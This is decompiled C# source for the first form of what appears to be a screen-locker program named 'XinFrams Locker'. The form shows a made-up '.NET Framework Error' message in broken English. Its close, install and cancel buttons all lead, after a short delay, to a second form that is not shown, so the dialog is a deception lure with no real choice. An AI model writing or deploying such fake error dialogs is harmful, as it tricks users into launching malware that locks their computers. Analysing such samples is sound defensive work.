using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace XinFrams_Locker;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Button button1;

	private Button button2;

	private Button button3;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		Thread.Sleep(2500);
		Form2 form = new Form2();
		((Control)form).Show();
	}

	private void button3_Click(object sender, EventArgs e)
	{
		Thread.Sleep(2500);
		Form2 form = new Form2();
		((Control)form).Show();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Thread.Sleep(2500);
		Form2 form = new Form2();
		((Control)form).Show();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		button1 = new Button();
		button2 = new Button();
		button3 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("MS UI Gothic", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)label1).set_Location(new Point(3, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(282, 12));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Error! Your Computer Not Install NET Framework V4.7");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(3, 30));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(393, 12));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Not Running File \"XinFrams Locker.exe\" Your NET Framework Version:V4.1");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(3, 51));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(418, 12));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("Not Running File \"XinFrams Locker.exe\" Error File NET Framework Version:V4.7");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(3, 72));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(252, 12));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("Wer You Computer Install NET Framework V4.7?");
		((Control)button1).set_Location(new Point(5, 96));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("閉じる");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)button2).set_Location(new Point(346, 96));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(5);
		((Control)button2).set_Text("インストール");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button3).set_Location(new Point(265, 96));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(75, 23));
		((Control)button3).set_TabIndex(6);
		((Control)button3).set_Text("キャンセル");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(436, 128));
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("NET Framework Error");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
